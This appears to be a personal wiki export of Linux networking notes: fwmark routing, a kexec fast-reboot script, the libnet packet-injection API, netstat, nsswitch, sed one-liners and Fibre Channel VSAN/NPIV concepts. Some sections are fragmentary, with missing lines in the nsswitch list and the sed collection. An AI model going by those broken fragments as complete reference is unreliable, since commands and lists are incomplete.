With these iptables lines we have instructed netfilter to mark packets matching these criteria with the fwmark and we have prepared the NAT rules so that our outbound packets will originate from the correct ~IPs.

Once again, it is important to realize that the fwmark added to a packet is only valid and discernible while the packet is still on the host running the packet filter. The fwmark is stored in a data structure the kernel uses to track the packet. Because the fwmark is not a part of the packet itself, the fwmark is lost as soon as the packet has left the local machine.

iproute2 supports the use of fwmark as a selector for rule lookups, so we can use fwmarks in the routing policy database to cause packets to be conditionally routed based on that fwmark. This can lead to great complexity if a machine has multiple routing tables, packet filters, and other fancy networking tools, such as NAT or proxies. Caveat emptor.

A convention is to use the same number for a routing table and fwmark where possible. This simplifies the maintenance of the systems which are using iproute2 and fwmark, especially if the table identifier and fwmark are set in a configuration file with the same variable name. Since we are testing this on the command line, we'll just make sure that we can add the rules first.

<pre>A package called kexec can speed up your reboots.

The system is simple, and consists of two parts: a kexec-enabled kernel and the kexec-tools package. Most modern kernels already support kexec functionality. As for the second part, you can get the kexec-tools software either from your distribution's repositories or from the kexec project page.To check if the current kernel suports kexec or not
{{{
grep CONFIG_KEXEC=y /boot/config-`uname -r` &amp;&amp; echo yes || echo no
}}}

 When you load a new kernel by running kexec you are overwriting the existing kernel with the kernel you specify. While this has the effect of rebooting the system quickly, it also skips the process that resets all of your hardware to a &quot;clean&quot; state, which can have some unpredictable consequences depending on the hardware that you use. For example, the video card on my system is an old Nvidia GeForce2 Go, and I had been using the legacy driver from Nvidia for it. After using kexec to reboot, the video never worked correctly. When I switched to the open source driver, the video came up just fine. Outcomes like this may be as varied as the kinds of hardware that exist. You just need to be aware of the possibility of problems in case something happens that you don't expect.

You also need to know that kexec only reboots the kernel -- it does not take care of any cleanup such as shutting down applications or unmounting disks. We are going to set up a script that will take care of the whole process.

Sample script to use (in /etc/init.d/reboot ?)
{{{
do_stop () {

        UNAMER=`uname -r` # this checks the version of the kernel 

       #This just puts all of the parameters for loading in one place
	KPARAMS=&quot;-l &quot; # tells kexec to load the kernel

	# --append tells the kernel all of its parameters
	# cat /proc/cmdline gets the current kernel's command line
	KPARAMS=$KPARAMS&quot;--append=\&quot;`cat /proc/cmdline`\&quot; &quot;

	# this tells the kernel what initrd image to use
	KPARAMS=$KPARAMS&quot;--initrd=/boot/initrd.img-$UNAMER &quot;

	# this tells the kexec what kernel to load
	KPARAMS=$KPARAMS&quot;/boot/vmlinuz-$UNAMER&quot;
	
        # Message should end with a newline since kFreeBSD may
        # print more stuff (see #323749)
        log_action_msg &quot;Will now restart&quot;

        if [ -x `which kexec` ]; then # check for the kexec executable
                kexec $KPARAMS  # load the kernel with the correct parameters
                sync            # sync all of the disks so as not to lose data
                umount -a       # make sure all disks are unmounted
                kexec -e        # reboot the kernel
        fi

        #This next line should never happen.
        reboot -d -f -i
}
}}}
You want to load the new kernel with the current command line because it is not going to get a command line from a bootloader. Also, you have to use the vmlinuz image because kexec doesn't support compressed images. The sync command simply makes sure that all of the data that might be cached is written to the disk; remember, kexec doesn't care about the state of the disks, but if you boot a new kernel without properly handling the disks, you will run into problems. The umount -a command then makes sure that all of your disks are not open for business, and kexec -e reboots the computer.

Unless you have a driver issue you should be presented with your normal login when the system comes back up. If you aren't, you might be able to log in with SSH or a serial terminal and shut your system down properly. If not, you will probably have to hard boot. When you get control over your computer again, check all of the commands and their syntax -- you may have a typo. If not, you are probably looking at a driver issue. Look at /var/log/messages and the output of the dmesg command; they may give you a clue.

http://www.stanford.edu/~stinson/cs155/libnet/libnet_talk.ppt

Libnet(1.1.2) is a reasonably small programming library, written mainly in C, providing a high-level, standard portable interface to low-level network packet shaping, handling and injection primitives. Libnet allows you create ethernet/ip/tcp packets. It allows to create a packet at a time, send the packet, clear the existing packet and create a new packet. The upper level of libnet interface does not provide a way to operate on multiple packets at the same time. Header files are located in /usr/include/libnet.

!!!Steps in using libnet

* libnet_init to create a libnet_handle to a certain device.
{{{
libnet_t * libnet_init (int injection_type, char *device, char *err_buf)
}}}
** The device argument can be a device name, or NULL, or ip. The injection_type as in &quot;from the link layer up&quot; or &quot;from the network layer up&quot;. We'll use LIBNET_RAW4 (IPv4 and above) and LIBNET_LINK (link layer and above). err_buf is a string which will hold an error message if something goes wrong. The handle returned by this call maintains state for the entire session, tracks all memory usage and packet construction.

* Next step is to create headers(and payload) for the packet that we want to send.
{{{
      libnet_ptag_t libnet_build_tcp(u_int16_t sp, u_int16_t dp, u_int32_t seq, u_int32_t ack,
      u_int8_t control, u_int16_t win, u_int16_t sum, u_int16_t urg, u_int16_t len, u_int8_t *payload, u_int32_t payload_s, libnet_t *l, libnet_ptag_t ptag);
}}}
** This will allow you a tcp header and payload. Similarly libnet_build_ip and libnet_build_ethernet (optional) to create other protocol headers. The order of header creation should always be from top to bottom. i.e, always create tcp header before trying to create ip header, from the highest on the OSI model to the lowest. After you setup the headers, libnet_write can be used to write the data to the socket. Once the data has been written libnet_clear_packet can be used to clear the data structures for the existing packet and initialise a new packet. All of these functions operate on a libnet handle, which is acquired during libnet_init. There is no direct access to the actual packet that is sent.

|10baseT-FD	|10 megabit full duplex|
|100baseTx-HD	|100 megabit half duplex|
|100baseTx-FD	|100 megabit full duplex|

The raw number indicates the number of bits which can be exchanged between two Ethernet devices over the wire. So 10 megabit Ethernet can support the transmission of ten million bits per second. The suffix to each identifier indicates whether both hosts can send and receive simultaneously or not. Half duplex means that each device can either send or receive in the same instant. Full duplex means that both devices can send and receive simultaneously.

<pre>!netstat
 One of the most common uses of the netstat  utility is to determine the state of sockets on a machine. There are many questions that netstat can answer with the right set of options. Here's a list of some of the things different things we can learn.

* which services are listening on which sockets
* what process (and controlling PID) is listening on a given socket
* whether data is waiting to be read on a socket
* what connections are currently established to which sockets 

By invoking netstat without any options, you are asking for a list of all currently open connections to and from the networking stack on the local machine. This means IP network connections, unix domain sockets, IPX sockets and Appletalk sockets among others.

A convenient feature of netstat is its ability to differentiate between two different sorts of name lookup. Normally the -n specifies no name lookup, but this is ambiguous when there are hostnames, port names, and user names. Fortunately, netstat offers the following options to differentiate the different forms of lookup and suppress only the [un-]desired lookup.

* {{{--numeric-hosts}}}
* {{{--numeric-ports}}}
* {{{--numeric-users}}}

The option -n, suppress all hostname, port name and username lookup, and is a synonym for {{{--numeric}}}. I'll reiterate that hostnames and DNS in particular can be confusing, or worse, misleading when trying to diagnose or debug a networking related issue, so it is wise to suppress hostname lookups in these sorts of situations.

netstat abbreviates the IP endpoint in order to reproduce the entire string retrieved from the port lookup (in /etc/services). Also interestingly, this line conveys to us (in the first output) that the kernel is waiting for the remote endpoint to acknowledge the 192 bytes which are still in the ~Send-Q buffer. 

The first line describes a TCP connection to the IP locally hosted on morgan's Ethernet interface. The connection was initiated from an ephemeral port (40991) on tristan to a service running on port 22. The service normally running on this well-known port is sshd, so we can conclude that somebody on tristan has connected to the morgan's ssh server. The second line describes a TCP session open to port 993 on isolde, which probably means that the user on morgan has an open connection to an IMAP over SSL server. 

The final line of our netstatoutput shows a connection in the ~TIME_WAIT state, which means that the TCP sessions have been terminated, but the kernel is waiting for any packets which may still be left on the network for this session. It is not at all abnormal for sockets to be in a ~TIME_WAIT state for a short period of time after a TCP session has ended.

By default, resolution moves from one source to the next (e.g., falls back to /etc/hosts from DNS) if the first source isn't available or the name being looked up isn't found. You can modify this behavior by specifying a condition and an action in square brackets between the sources. The possible conditions are:

** The source hasn't been configured (in DNS's case, there is no resolv.conf file, and there is no nameserver running on the local host). 
* NOTFOUND 
** The source can't find the name in question (for DNS, the name looked up or the type of data looked up doesn't exist). 
* TRYAGAIN

* SUCCESS

{{{
FILE SPACING:

 # double space a file
 sed G

 # double space a file which already has blank lines in it. Output file
 # should contain no more than one blank line between lines of text.
 sed '/^$/d;G'

 # triple space a file
 sed 'G;G'

 # undo double-spacing (assumes even-numbered lines are always blank)
 sed 'n;d'

 # insert a blank line above every line which matches &quot;regex&quot;
 sed '/regex/{x;p;x;}'

 # insert a blank line below every line which matches &quot;regex&quot;
 sed '/regex/G'

 # insert a blank line above and below every line which matches &quot;regex&quot;
 sed '/regex/{x;p;x;G;}'

NUMBERING:

 # number each line of a file (simple left alignment). Using a tab (see
 # note on '\t' at end of file) instead of space will preserve margins.
 sed = filename | sed 'N;s/\n/\t/'

 # number each line of a file (number on left, right-aligned)
 sed = filename | sed 'N; s/^/     /; s/ *\(.\{6,\}\)\n/\1  /'

 # number each line of file, but only print numbers if line is not blank
 sed '/./=' filename | sed '/./N; s/\n/ /'

 # count lines (emulates &quot;wc -l&quot;)
 sed -n '$='

TEXT CONVERSION AND SUBSTITUTION:

 # IN UNIX ENVIRONMENT: convert DOS newlines (CR/LF) to Unix format
 sed 's/.$//'               # assumes that all lines end with CR/LF
 sed 's/^M$//'              # in bash/tcsh, press Ctrl-V then Ctrl-M
 sed 's/\x0D$//'            # gsed 3.02.80, but top script is easier

 # IN UNIX ENVIRONMENT: convert Unix newlines (LF) to DOS format
 sed &quot;s/$/`echo -e \\\r`/&quot;            # command line under ksh
 sed 's/$'&quot;/`echo \\\r`/&quot;             # command line under bash
 sed &quot;s/$/`echo \\\r`/&quot;               # command line under zsh
 sed 's/$/\r/'                        # gsed 3.02.80

 # IN DOS ENVIRONMENT: convert Unix newlines (LF) to DOS format
 sed &quot;s/$//&quot;                          # method 1
 sed -n p                             # method 2

 # IN DOS ENVIRONMENT: convert DOS newlines (CR/LF) to Unix format
 # Can only be done with UnxUtils sed, version 4.0.7 or higher.
 # Cannot be done with other DOS versions of sed. Use &quot;tr&quot; instead.
 sed &quot;s/\r//&quot; infile &gt;outfile         # UnxUtils sed v4.0.7 or higher
 tr -d \r &lt;infile &gt;outfile            # GNU tr version 1.22 or higher

 # delete leading whitespace (spaces, tabs) from front of each line
 # aligns all text flush left
 sed 's/^[ \t]*//'                    # see note on '\t' at end of file

 # delete trailing whitespace (spaces, tabs) from end of each line

 # center all text in the middle of 79-column width. In method 1,

 # spaces are appended at the end of the line. In method 2, spaces at
 # the beginning of the line are discarded in centering the line, and

 sed '/^end/,/^begin/d' &quot;$@&quot; | uudecode                    # vers. 2

 # zip up each .TXT file individually, deleting the source file and
 # setting the name of each .ZIP file to the basename of the .TXT file
 # (under DOS: the &quot;dir /b&quot; switch returns bare filenames in all caps).
 echo @echo off &gt;zipup.bat
 dir /b *.txt | sed &quot;s/^\(.*\)\.TXT/pkzip -mo \1 \1.TXT/&quot; &gt;&gt;zipup.bat

TYPICAL USE: Sed takes one or more editing commands and applies all of
them, in sequence, to each line of input. After all the commands have
been applied to the first input line, that line is output and a second
input line is taken for processing, and the cycle repeats. The
preceding examples assume that input comes from the standard input
device (i.e, the console, normally this will be piped input). One or
more filenames can be appended to the command line if the input does
not come from stdin. Output is sent to stdout (the screen). Thus:

 cat filename | sed '10q'        # uses piped input
 sed '10q' filename              # same effect, avoids a useless &quot;cat&quot;
 sed '10q' filename &gt; newfile    # redirects output to disk

For additional syntax instructions, including the way to apply editing
commands from a disk file instead of the command line, consult &quot;sed &amp;
awk, 2nd Edition,&quot; by Dale Dougherty and Arnold Robbins (O'Reilly,
1997; http://www.ora.com), &quot;UNIX Text Processing,&quot; by Dale Dougherty
and Tim O'Reilly (Hayden Books, 1987) or the tutorials by Mike Arst
distributed in U-SEDIT2.ZIP (many sites). To fully exploit the power
of sed, one must understand &quot;regular expressions.&quot; For this, see
&quot;Mastering Regular Expressions&quot; by Jeffrey Friedl (O'Reilly, 1997).
The manual (&quot;man&quot;) pages on Unix systems may be helpful (try &quot;man
sed&quot;, &quot;man regexp&quot;, or the subsection on regular expressions in &quot;man
ed&quot;), but man pages are notoriously difficult. They are not written to
teach sed use or regexps to first-time users, but as a reference text
for those already acquainted with these tools.

QUOTING SYNTAX: The preceding examples use single quotes ('...')
instead of double quotes (&quot;...&quot;) to enclose editing commands, since
sed is typically used on a Unix platform. Single quotes prevent the
Unix shell from intrepreting the dollar sign ($) and backquotes
(`...`), which are expanded by the shell if they are enclosed in
double quotes. Users of the &quot;csh&quot; shell and derivatives will also need
to quote the exclamation mark (!) with the backslash (i.e., \!) to
properly run the examples listed above, even within single quotes.
Versions of sed written for DOS invariably require double quotes
(&quot;...&quot;) instead of single quotes to enclose editing commands.

USE OF '\t' IN SED SCRIPTS: For clarity in documentation, we have used
the expression '\t' to indicate a tab character (0x09) in the scripts.
However, most versions of sed do not recognize the '\t' abbreviation,
so when typing these scripts from the command line, you should press
the TAB key instead. '\t' is supported as a regular expression
metacharacter in awk, perl, and HHsed, sedmod, and GNU sed v3.02.80.

VERSIONS OF SED: Versions of sed do differ, and some slight syntax
variation is to be expected. In particular, most do not support the
use of labels (:name) or branch instructions (b,t) within editing
commands, except at the end of those commands. We have used the syntax
which will be portable to most users of sed, even though the popular
GNU versions of sed allow a more succinct syntax. When the reader sees
a fairly long command such as this:

   sed -e '/AAA/b' -e '/BBB/b' -e '/CCC/b' -e d

it is heartening to know that GNU sed will let you reduce it to:

   sed '/AAA/b;/BBB/b;/CCC/b;d'      # or even
   sed '/AAA\|BBB\|CCC/b;d'

In addition, remember that while many versions of sed accept a command
like &quot;/one/ s/RE1/RE2/&quot;, some do NOT allow &quot;/one/! s/RE1/RE2/&quot;, which
contains space before the 's'. Omit the space when typing the command.

OPTIMIZING FOR SPEED: If execution speed needs to be increased (due to
large input files or slow processors or hard disks), substitution will
be executed more quickly if the &quot;find&quot; expression is specified before
giving the &quot;s/.../.../&quot; instruction. Thus:

   sed 's/foo/bar/g' filename         # standard replace command
   sed '/foo/ s/foo/bar/g' filename   # executes more quickly
   sed '/foo/ s//bar/g' filename      # shorthand sed syntax

On line selection or deletion in which you only need to output lines
from the first part of the file, a &quot;quit&quot; command (q) in the script
will drastically reduce processing time for large files. Thus:

   sed -n '45,50p' filename           # print line nos. 45-50 of a file
   sed -n '51q;45,50p' filename       # same, but executes much faster

In computer networking, a virtual storage area network (VSAN) is a collection of ports from a set of connected Fibre Channel switches, that form a virtual fabric. Ports within a single switch can be partitioned into multiple VSANs, despite sharing hardware resources. Conversely, multiple switches can join a number of ports to form a single VSAN.

A VSAN, like each FC fabric, can offer different high-level protocols such as FCP, FCIP, FICON, iSCSI. Each VSAN is a separate self-contained fabric using distinctive security policies, zones, events, memberships, and name services. Traffic is also separate.

One major concern when designing and building Fibre Channel-based SANs is the total number of switches or domains that can exist in a physical fabric. As the edge switch population grows, the number of domain IDs becomes a concern. The domain is the address of a physical switch or logical virtual fabric; the domain ID is the most significant byte in an endpoint Fibre Channel ID.

[img[images/fc.id.jpg]]

The switch uses this Fibre Channel ID to route frames from a given source (initiator) to any destination (target) in a SAN fabric. This 1 byte allows up to 256 possible addresses. The Fibre Channel standard allows for a total of 239 port addresses.

Another design concern is interoperability with third-party switches. In the past, different SAN fabric vendors interpreted the Fibre Channel addressing standard differently. In addition, some vendor-specific attributes used for switch-to-switch connectivity (or expansion port [E-Port] connectivity) made connection of switches from different vendors challenging, leading customers to implement edge switch technology that matched the core director type in the fabric.

!N_Port ID Virtualization
N_Port ID Virtualization or NPIV is a Fibre Channel facility allowing multiple N_Port IDs to share a single physical N_Port. This allows multiple Fibre Channel initiators to occupy a single physical port, easing hardware requirements in Storage area network design, especially where virtual SANs are called for.

NPIV allows a Fibre Channel host connection or N-Port, to be assigned multiple N-Port IDs or Fibre Channel IDs (FCIDs) over a single link. All FCIDs assigned can now be managed on a Fibre Channel fabric as unique entities on the same physical host. Different applications can be used in conjunction with NPIV. In a virtual machine environment where many host operating systems or applications are running on a physical host, each virtual machine can now be managed independently from zoning, aliasing, and security perspectives.

A host bus adapter (HBA) that supports the NPIV feature follows the standard login process. The initial connection and login to the fabric is performed through the standard F-Port login (FLOGI) process. All subsequent logins for either virtual machines or logical part ions on a mainframe are transformed into FDISC login commands. The FDISC logins follow the same standard process. Figure 3 steps through the login process of an NPIV uplink and the local logins to the NPIV-enabled adapter.

Normally N_Port initialization proceeds like this:
* N_Port sends FLOGI to address 0xFFFFFE to obtain a valid address
* N_Port sends PLOGI to address 0xFFFFFC to register this address with the name server
* N_Port sends SCR to address 0xFFFFFD to register for state change notifications

However with NPIV it may continue like this:

* N_Port sends FDISC to address 0xFFFFFE to obtain an additional address
* N_Port sends PLOGI to address 0xFFFFFC to register his additional address with the name server
* N_Port sends SCR to address 0xFFFFFD to register for state change notifications.
* ... (repeat FDISC/PLOGI/SCR for next address)

FDISC is abbreviation of &quot;Discover Fabric Service Parameters&quot;, which is a misleading name in this context. It works just like FLOGI.

When using NPIV in vSAN environment, each subsequent FDISC login will be a part of the same VSAN as the original fabric login.

!N-Port Virtualiser
An extension to NPIV is the N-Port Virtualizer feature. The N-Port Virtualizer feature allows the blade switch or top-of-rack fabric device to behave as an NPIV-based HBA to the core Fibre Channel director (Figure 4). As end devices log into the NPV-enabled edge switches, the FCID addresses that are assigned use the domain of the core director. Because the connection is treated as an N-Port and not an E-Port to the core director, the edge switch shares the domain ID of the core switch as FCIDs are being allocated. The edge NPV-enabled switch no longer requires a separate domain ID to receive connectivity to the fabric.

!F-Port Trunking(Channeling)
Fabric Port (F-Port) Trunking and F-Port Channeling. A PortChannel is the bundling of multiple physical interfaces into one logical high-bandwidth link. 

Two new features on the horizon will provide more granular management from an NPV perspective. These are Fabric Port (F-Port) Trunking and F-Port Channeling. A PortChannel is the bundling of multiple physical interfaces into one logical high-bandwidth link. PortChannels provide higher bandwidth, increased link redundancy, and load balancing between two switches. In the Cisco implementation, a port on any module, anywhere on the switch, can be a part of a PortChannel. Route table changes due to a single link failure in the PortChannel interface are unaffected.

The Cisco virtual fabric implementation states that a single F-Port can be a part of one, and only one, VSAN at any given time. An interswitch link (ISL) that is configured in trunk mode, however, can carry multiple VSANs across a single ISL or PortChannel and still keep fabric separation between VSANs. One of the drawbacks of configuring edge devices in NPV mode is that because the link between switches is configured to log in to the fabric as an F-Port, the F-Port uplink can be configured to be in only a single VSAN and carry only a single VSAN across its link. The NPV device can be configured with multiple uplinks, and each can be placed in a different VSAN. The hosts on the NPV device can then be placed in one of those VSANs, and the hosts will log through the appropriate NP uplink port.

F-Port Trunking will allow a single F-Port to participate in multiple VSANs and follow the trunking protocol that Cisco currently has across an ISL. This feature will allow the consolidation of uplinks ports necessary for extending VSAN connectivity to the NP device. Figure 6 shows the connection and how the network will look with F-Port Trunking enabled.

Enabling F-Port Trunking allows any blade server connectivity over any NP uplink across which the VSAN is trunked. This feature can be extended to HBA connections when the HBA vendors enable VSAN trunking within their firmware. F-Port Trunking can enable virtual machines on physical servers to log in and participate in separate VSANs per application or line of business.
The other significant feature on the horizon is F-Port Channeling (Figure 7). As described earlier, when a host logs in to the local switch, its FDISC message is load balanced in a round-robin fashion. Should the link on which the host has its session fail, the host would have to log in again to the fabric, restarting the login process. N-Port uplinks from the NPV device cannot be bundled to take advantage of any type of high availability.

F-Port Channeling will allow the same type of resiliency and availability between switches as an ISL PortChannel has today. In this configuration, multiple NP uplink ports can be bundled or channeled together to form a single logical link. Should a single link in the channel fail, the data frames crossing that single link would be lost, and typical application and network error recovery would take place.

The other concern that F-Port Channeling resolves also relates to link failures. With F-Port Channeling configured, when a link that originally carried the login process from the edge NPV device to the core fails, the host is no longer required to perform a full login again to the fabric. The login state remains intact even though the link has failed. As long as a single link in the channel is operational, the host does not go through the login process

In a F-Port Port-Channel logical link, if a single link fails in the channel, the host no longer has to login again to the fabric to get connectivity. The host will remain logged in; the data flow that was on the link that failed will need to go through recovery mode, but the host will stay logged into the network. Data traffic will also be load balanced on a src/dst hash or src/dst/oxid hash to send traffic down the bundled uplinks. This feature removes the need to perform manual load balancing again across NP uplinks during a failure and recovery period.
